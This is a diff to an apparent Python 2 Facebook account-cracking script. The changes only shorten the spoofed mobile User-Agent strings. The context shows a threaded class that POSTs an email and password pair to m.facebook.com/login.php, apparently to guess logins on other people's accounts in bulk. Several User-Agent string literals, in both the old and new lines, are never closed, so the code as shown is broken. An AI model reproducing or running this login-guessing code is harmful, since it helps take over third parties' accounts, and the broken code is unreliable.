@@ -32,7 +32,7 @@ br.set_handle_referer(True)
 br.set_cookiejar(cookielib.LWPCookieJar())
 br.set_handle_redirect(True)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 7.0; MI MAX Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36)]
+br.addheaders = [('User-Agent','Mozilla/5.0 Android 7.0; AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36)]
 def bacaData():
 	global fid_bgroup,fid_bteman
 	try:
@@ -211,7 +211,7 @@ class mt(threading.Thread):
         return self.a,self.id
     def run(self):
         try:
-             data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android 7.0; MI MAX Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36}))
+             data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 Android AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36}))
         except KeyboardInterrupt:
             os.sys.exit()
         except:
